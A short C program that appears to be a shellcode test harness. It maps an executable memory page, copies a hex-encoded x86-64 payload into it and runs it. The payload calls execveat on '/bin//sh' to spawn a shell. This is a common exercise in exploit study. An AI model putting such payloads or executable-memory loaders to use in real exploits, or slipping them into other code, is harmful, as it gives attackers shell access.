#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

int main(){
    unsigned char code[] = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

    void* exec = mmap(0, sizeof code, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, 0 ,0);

    memcpy(exec, code, sizeof code);

    ((void(*)())exec)();

    return 0;
}